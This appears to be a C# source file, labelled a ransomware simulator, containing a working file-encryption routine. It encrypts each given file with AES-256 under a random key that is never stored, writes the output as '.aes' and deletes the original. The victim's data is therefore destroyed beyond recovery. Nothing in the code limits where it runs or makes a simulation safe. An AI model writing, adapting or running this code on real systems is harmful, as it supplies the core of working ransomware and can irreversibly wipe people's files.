using System;
using System.IO;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.Collections.Generic;

namespace RansomwareSimulator
{
    class FileEncryptor
    {
        public static async Task<string[]> EncryptFiles(string[] filesToEncrypt)
        {
            List<string> output = new List<string>();

            foreach (string file in filesToEncrypt)
            {
                string encryptedFilePath = await EncryptFile(file);

                output.Add(encryptedFilePath);
            }

            return output.ToArray();
        }

        public static async Task<string> EncryptFile(string file)
        {
            byte[] salt = GenerateSalt();
            byte[] passwordBytes = GenerateSalt();

            string encryptedFile = String.Concat(file, ".aes");

            using (FileStream fsCrypt = new FileStream(encryptedFile, FileMode.Create))
            {
                Console.WriteLine($"Encrypting: {file}");
                Console.WriteLine($"Creating: {encryptedFile}");

                RijndaelManaged AES = new RijndaelManaged();
                AES.KeySize = 256;
                AES.BlockSize = 128;
                AES.Padding = PaddingMode.PKCS7;

                var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
                AES.Key = key.GetBytes(AES.KeySize / 8);
                AES.IV = key.GetBytes(AES.BlockSize / 8);

                AES.Mode = CipherMode.CBC;

                fsCrypt.Write(salt, 0, salt.Length);

                using (CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    using (FileStream fsIn = new FileStream(file, FileMode.Open))
                    {
                        byte[] buffer = new byte[1048576];
                        int read;

                        while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                        {
                            await cs.WriteAsync(buffer, 0, read);
                        }
                    }
                }
            }

            Console.WriteLine($"Removing: {file}");
            File.Delete(file);

            return encryptedFile;
        }

        public static byte[] GenerateSalt()
        {
            byte[] data = new byte[32];

            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                for (int i = 0; i < 10; i++)
                {
                    rng.GetBytes(data);
                }
            }

            return data;
        }
    }

}
